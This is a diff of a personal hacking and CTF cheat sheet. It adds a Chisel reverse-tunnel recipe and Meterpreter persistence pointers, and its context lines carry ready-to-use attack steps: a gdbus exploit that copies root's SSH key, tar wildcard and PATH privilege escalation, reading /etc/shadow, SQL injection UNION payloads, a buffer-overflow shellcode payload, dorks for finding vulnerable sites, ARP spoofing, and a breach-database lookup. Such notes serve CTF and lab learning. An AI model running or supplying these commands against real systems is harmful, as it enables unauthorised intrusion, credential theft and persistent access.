@@ -42,6 +42,7 @@ and on and on and on
 23. On windows, always check `whoami /priv` and find recent vulnerability.
 
 
+
 **Capabilities**
 https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
 
@@ -65,14 +66,36 @@ In short, we can use tar as root, so we can:
 - see the inside > `cat etc/shadow`
 
 
+
 **Gdbuss Root SSH Privesc**
 1. gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_rsa true
 https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
 
 
+
+**Chisel**
+- If there's an attempt to SSH or something outside the docker container we are in and we cant access it. We need to socks proxy stuff it somehow.
+- If we are trapped inside a docker container.
+
+./chisel server --help
+./chisel client --help
+
+On our machine:
+1. `sudo ~/tools/chisel server -p [Anyport] --reverse`
+
+On the target Machine:
+2. Transfer the chisel client
+3. chmod +x chisel
+4. ./chisel client [Our IP]:[Our Port] R:[Localport usually 22]:[The IP we want to proxy]:[The Service port we want to proxy]
+R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
+IF error, or stuff, just remove the local interface
+
+
+
 **LOGS**
 1. Always check /var/log/auth.log
 2. Always check /var/log/apache2/access.log
+
 
 
 **Wild card privesc**
@@ -92,10 +115,12 @@ echo "chmod +s /bin/bash" > exploit.sh
 4. The touch and checkpoint command will make the tar command to execute the exploit.sh which allow us to escalate our privillege
 
 
+
 **NFS2049**
 1. showmount -e <remote-ip>
 2. sudo mkdir /mnt/[name_of_the_mount]
 3. sudo mount <remote-ip>:[shared_directory] /mnt/[name_of_the_mount]
+
 
 
 **Impacket**
@@ -111,6 +136,7 @@ Example:
 and many more.. go research on it.
 
 [] >>> means optional command
+
 
 
 **PATH Privesc**
@@ -132,9 +158,11 @@ cat >>> can
 ### Does not have to be in /tmp, u can create your own folder
 
 
+
 **How to create environment variable**
 1. export [varname]=[value]
 2. echo $[varname]
+
 
 
 **XSS**
@@ -149,11 +177,13 @@ https://aem1k.com/aurebesh.js/#%3Cscript%3Eak
 3. ..
 
 
+
 **Little SQLI**
 1. 'UNION SELECT 1,table_name,column_name FROM information_schema.columns -- -
 2. 'UNION SELECT 1,group_concat(sql),3 FROM sqlite_master -- -
 3. 'UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata -- - (get list of databases)
 4. 'UNION SELECT group_concat(column_name),group_concat(table_name),3,4 from information_schema.columns WHERE table_schema='[db_name]'-- -
+
 
 
 **Bufferoverflow**
@@ -196,6 +226,7 @@ Example:
 `payload = b"A"*146 + b"\xC3\x14\x04\x08" + b"\x90" * 20 + shellcode`
 
 
+
 **Fix your terminal**
 1. python3 -c 'import pty;pty.spawn("/bin/bash");'
 2. export TERM=xterm >>> so you can clear
@@ -204,9 +235,11 @@ Example:
 5. fg
 
 
+
 **CTF Tools**
 1. Forensics >> exiftool, volatility, zsteg, stegsolve, stegcracker, steghide
 2. Way Back Machine can see everything, not only dead websites
+
 
 
 **SSH with id_rsa**
@@ -214,9 +247,11 @@ Example:
 2. ssh -i id_rsa [user]@[ip]
 
 
+
 **Dorking**
 1. Possible SQLi target >>> inurl:"product.php?id=" & intext:"You have an error in your SQL syntax"
 2. Open FTP >>> "intitle: index of" inurl:ftp
+
 
 
 **ARP**
@@ -233,10 +268,12 @@ Or just langsung pake -r (both direction)
 2. Or just use bettercap and do this all automaticly tbh.
 
 
+
 **Wireshark**
 1. [FILTER] && [FILTER] && [FILTER] >>> Filtering stuff
 Ex: ip.src == [IP] && http 
 2. Follow the stream~
+
 
 
 **Crunch**
@@ -261,6 +298,7 @@ Pattern (-t)
 Charset (-f)
 - Lookat the preset charsets in /usr/share/crunch/charset.lst
 - crunch 2 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o ww.txt
+
 
 **Random**
 1. hashcat --example-hash >> or just visit the one in the web
@@ -309,6 +347,7 @@ https://namechk.com/
 https://scylla.sh/api (Breach database) (ex = email:rudolphthered@hotmail.com, password:spygame, [what to search]:[the data])
 
 
+
 **Tricks**
 1. [command name]() { cd "$@" && ls; } >> Auto ls when cd
 ex:
@@ -316,3 +355,6 @@ cdls(){ cd "$@" && ls; }
 i prefer just c
 2. .bashrc is the file that's executed first when you logged in to SSH, to login without activiting it do 
 `ssh -t [username]@[ip] /bin/sh`
+3. Automatc meterpreter persistance
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
+4. PYTHONENV is the python environment variable, SO IF WE CHANGE IT THE IMPORT LOCATION ALSO CHANGES
